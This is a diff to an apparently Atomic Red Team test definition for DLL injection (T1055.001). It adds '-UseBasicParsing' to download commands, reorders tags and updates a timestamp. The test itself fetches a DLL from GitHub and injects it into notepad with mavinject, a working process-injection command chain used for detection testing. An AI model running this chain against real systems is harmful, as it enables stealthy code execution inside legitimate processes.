@@ -18,8 +18,8 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll"
-          -OutFile "PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll"; fi; $mypid
-          = (Start-Process notepad -PassThru).id; mavinject $mypid /INJECTRUNNING
+          -OutFile "PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll" -UseBasicParsing;
+          fi; $mypid = (Start-Process notepad -PassThru).id; mavinject $mypid /INJECTRUNNING
           "PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll"; Stop-Process -processname
           notepad'
         elevation_required: true
@@ -29,9 +29,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - t1055.001
-  - atomic-red-team
   - stealth
+  - atomic-red-team
+  - t1055.001
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -54,9 +54,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll"
-        -OutFile "#{dll_payload}"
+        -OutFile "#{dll_payload}" -UseBasicParsing
 
         '
     technique_created: '2020-01-14T01:26:08.145Z'
     atomic_guid: 74496461-11a1-4982-b439-4d87a550d254
-    import_timestamp: '2026-10-20T07:08:26.988005Z'
+    import_timestamp: '2026-10-21T07:01:49.705615Z'
